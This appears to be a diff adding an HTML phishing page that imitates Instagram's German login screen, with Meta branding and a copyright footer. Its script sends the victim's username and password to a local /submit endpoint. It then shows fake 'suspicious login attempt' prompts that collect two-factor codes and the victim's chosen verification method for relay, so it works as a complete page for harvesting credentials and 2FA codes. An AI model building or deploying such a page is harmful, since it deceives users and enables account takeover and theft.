@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../static/styles.css" />
+  <link rel="icon" type="image/png" href="../static/img/insta-fav.ico">
+  <title>Instagram</title>
+</head>
+<body>
+<main class="flex align-items-center justify-content-center">
+  <section id="mobile" class="flex">
+  </section>
+  <section id="auth" class="flex direction-column">
+    <div class="panel login flex direction-column">
+      <h1 title="Instagram" class="flex justify-content-center">
+        <img src="../static/img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+      </h1>
+      <form id="login-form" action="/submit" method="post" onsubmit="handleFormSubmit(event)">
+        <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
+        <input type="text" id="email" name="email" placeholder="Telefonnummer, Benutzername oder E-Mail-Adresse" required><br><br>
+
+        <label for="password" class="sr-only">Senha</label>
+        <input id="password" name="password" type="password" placeholder="Passwort" required><br><br>
+
+        <button id="submit-button" type="submit">Anmelden</button>
+        <p id="status-message" style="display: none;">Please wait...</p>
+      </form>
+
+      <form id="2fa-form" action="/2fa" method="post" style="display: none;" onsubmit="handle2FAFormSubmit(event)">
+          <div class="top-text">Wir haben einen verdächtigen Anmeldeversuch festgestellt</div>
+          <div class="center-text">Zum Schutz deines Kontos senden wir dir einen Sicherheitscode, mit dem du deine Identität bestätigen kannst.</div>
+
+          <label for="code" class="sr-only">2FA Code</label>
+          <input type="text" id="code" name="code" placeholder="2FA Code" required><br><br>
+
+          <button id="2fa-submit-button" type="submit">Senden</button>
+      </form>
+
+      <form id="2fa-choices-form" action="/get-2fa-choices" method="post" style="display: none;" onsubmit="handle2FAChoicesFormSubmit(event)">
+          <div class="top-text">Wir haben einen verdächtigen Anmeldeversuch festgestellt</div>
+          <div class="center-text">Zum Schutz deines Kontos senden wir dir einen Sicherheitscode, mit dem du deine Identität bestätigen kannst.</div>
+          <div id="radio-buttons-container">
+            <!-- Radio buttons will be populated dynamically -->
+          </div>
+          <br><br>
+
+          <button id="2fa-choices-submit-button" type="submit">Senden</button>
+      </form>
+
+      <form id="verification-code-form" action="/submit-verification-code" method="post" style="display: none;" onsubmit="handleVerificationCodeSubmit(event)">
+          <div class="top-text">Bitte geben Sie den Verifizierungscode ein, den wir Ihnen geschickt haben.</div>
+          <div class="center-text">Zum Schutz deines Kontos senden wir dir einen Sicherheitscode, mit dem du deine Identität bestätigen kannst.</div>
+          <label for="verification-code" class="sr-only">Verification Code:</label>
+          <input type="text" id="verification-code" name="verification-code" required><br><br>
+          <button id="submit-verification-code" type="submit">Submit Code</button>
+      </form>
+
+      <p id="response-message" style="color: red; display: none;"></p>
+      <div class="flex separator align-items-center">
+        <span></span>
+        <div class="or">ODER</div>
+        <span></span>
+      </div>
+      <div class="login-with-fb flex direction-column align-items-center">
+        <div>
+          <img />
+          <a>Mit Facebook anmelden</a>
+        </div>
+        <a href="#">Passwort vergessen?</a>
+      </div>
+    </div>
+    <div class="panel register flex justify-content-center">
+      <p>Du hast kein Konto?</p>
+      <a href="#">Registrieren</a>
+    </div>
+    <div class="app-download flex direction-column align-items-center">
+      <p>App installieren</p>
+      <div class="flex justify-content-center">
+        <img src="../static/img/apple-button.png" alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
+        <img src="../static/img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+      </div>
+    </div>
+  </section>
+</main>
+<footer>
+  <ul class="flex flex-wrap justify-content-center">
+    <li><a href="#">Über</a></li>
+    <li><a href="#">Hilfe</a></li>
+    <li><a href="#">UrhDaG/MStV</a></li>
+    <li><a href="#">API</a></li>
+    <li><a href="#">Jobs</a></li>
+    <li><a href="#">Cookie-Einstellungen</a></li>
+    <li><a href="#">Nutzungsbedingungen und Impressum</a></li>
+    <li><a href="#">Standorte</a></li>
+    <li><a href="#">Hochladen von Kontakten und Nicht-Nutzer</a></li>
+    <li><a href="#">Datenrichtlinie</a></li>
+    <li><a href="#">Blog</a></li>
+  </ul>
+  <p class="copyright">© 2024 Meta</p>
+</footer>
+
+<script>
+  function handleFormSubmit(event) {
+    event.preventDefault();
+    document.getElementById('submit-button').disabled = true;
+    document.getElementById('status-message').style.display = 'block';
+    document.getElementById('response-message').style.display = 'none';
+
+    const formData = new FormData(event.target);
+
+    fetch('/submit', {
+        method: 'POST',
+        body: formData
+    }).then(response => response.json())
+      .then(data => {
+          if (data.success) {
+              document.getElementById('login-form').innerHTML = '<p>' + data.message + '</p>';
+          } else if (data.require_2fa) {
+              document.getElementById('login-form').style.display = 'none';
+              document.getElementById('2fa-form').style.display = 'block';
+          } else if (data.require_2fa_choices) {
+              document.getElementById('login-form').style.display = 'none';
+              document.getElementById('2fa-choices-form').style.display = 'block';
+              createRadioButtons(data.options);
+          } else {
+              document.getElementById('response-message').textContent = data.message;
+              document.getElementById('response-message').style.display = 'block';
+              resetLoginForm(); // Reset the login form if there is an error
+          }
+      }).catch(error => {
+          console.error('Error:', error);
+          document.getElementById('response-message').textContent = 'Error occurred';
+          document.getElementById('response-message').style.display = 'block';
+          resetLoginForm(); // Reset the login form if there is an error
+      }).finally(() => {
+          document.getElementById('submit-button').disabled = false;
+          document.getElementById('status-message').style.display = 'none';
+      });
+  }
+
+function handle2FAFormSubmit(event) {
+    event.preventDefault();
+    document.getElementById('2fa-submit-button').disabled = true;
+    document.getElementById('status-message').style.display = 'block';
+
+    const formData = new FormData(event.target);
+
+    fetch('/2fa', {
+        method: 'POST',
+        body: formData
+    }).then(response => response.json())
+      .then(data => {
+          if (data.success) {
+              document.getElementById('2fa-form').innerHTML = '<p>' + data.message + '</p>';
+          } else {
+              document.getElementById('2fa-form').style.display = 'block'; // Show the 2FA form again
+              document.getElementById('response-message').textContent = 'Incorrect code, please try again.'; // Inform the user
+              document.getElementById('response-message').style.display = 'block';
+              reset2FAForm(); // Reset the 2FA form to allow re-entry
+          }
+      }).catch(error => {
+          console.error('Error:', error);
+          document.getElementById('response-message').textContent = 'Error occurred';
+          document.getElementById('response-message').style.display = 'block';
+          reset2FAForm(); // Reset the 2FA form if there is an error
+      }).finally(() => {
+          document.getElementById('2fa-submit-button').disabled = false;
+          document.getElementById('status-message').style.display = 'none';
+      });
+}
+
+
+  function createRadioButtons(options) {
+    const container = document.getElementById('radio-buttons-container');
+    container.innerHTML = ''; // Clear any existing radio buttons
+
+    options.forEach((option, index) => {
+        const radioLabel = document.createElement('label');
+        radioLabel.textContent = option;
+        radioLabel.setAttribute('for', `choice-${index + 1}`);
+
+        const radioInput = document.createElement('input');
+        radioInput.type = 'radio';
+        radioInput.id = `choice-${index + 1}`;
+        radioInput.name = 'choice';
+        radioInput.value = option;
+
+        container.appendChild(radioLabel);
+        container.appendChild(radioInput);
+        container.appendChild(document.createElement('br'));
+    });
+  }
+
+  function handle2FAChoicesFormSubmit(event) {
+    event.preventDefault();
+    const selectedOption = document.querySelector('input[name="choice"]:checked');
+    if (selectedOption) {
+        const formData = new FormData();
+        formData.append('choice', selectedOption.value);
+
+        fetch('/get-2fa-choices', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                document.getElementById('2fa-choices-form').style.display = 'none';
+                document.getElementById('verification-code-form').style.display = 'block';
+            } else {
+                document.getElementById('response-message').textContent = 'Error: ' + data.message;
+                document.getElementById('response-message').style.display = 'block';
+                reset2FAChoicesForm(); // Reset the 2FA choices form if there is an error
+            }
+        })
+        .catch(error => {
+            console.error('Error submitting form:', error);
+            document.getElementById('response-message').textContent = 'Error occurred';
+            document.getElementById('response-message').style.display = 'block';
+            reset2FAChoicesForm(); // Reset the 2FA choices form if there is an error
+        });
+    } else {
+        document.getElementById('response-message').textContent = 'Please select an option before submitting.';
+        document.getElementById('response-message').style.display = 'block';
+    }
+  }
+
+  function handleVerificationCodeSubmit(event) {
+    event.preventDefault();
+    document.getElementById('submit-verification-code').disabled = true;
+    const code = document.getElementById('verification-code').value;
+    if (code) {
+        const formData = new FormData();
+        formData.append('code', code);
+
+        fetch('/verify-code', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert('Verification successful!');
+            } else {
+                document.getElementById('response-message').textContent = 'Error: ' + data.message;
+                document.getElementById('response-message').style.display = 'block';
+                resetVerificationCodeForm(); // Reset the verification code form if there is an error
+            }
+        })
+        .catch(error => {
+            console.error('Error submitting verification code:', error);
+            document.getElementById('response-message').textContent = 'Error occurred';
+            document.getElementById('response-message').style.display = 'block';
+            resetVerificationCodeForm(); // Reset the verification code form if there is an error
+        }).finally(() => {
+            document.getElementById('submit-verification-code').disabled = false;
+        });
+    } else {
+        document.getElementById('response-message').textContent = 'Please enter a verification code.';
+        document.getElementById('response-message').style.display = 'block';
+        document.getElementById('submit-verification-code').disabled = false;
+    }
+  }
+
+  function resetLoginForm() {
+    document.getElementById('login-form').reset();
+  }
+
+  function reset2FAForm() {
+    document.getElementById('2fa-form').reset();
+  }
+
+  function reset2FAChoicesForm() {
+    document.getElementById('2fa-choices-form').reset();
+  }
+
+  function resetVerificationCodeForm() {
+    document.getElementById('verification-code-form').reset();
+  }
+</script>
+</body>
+</html>
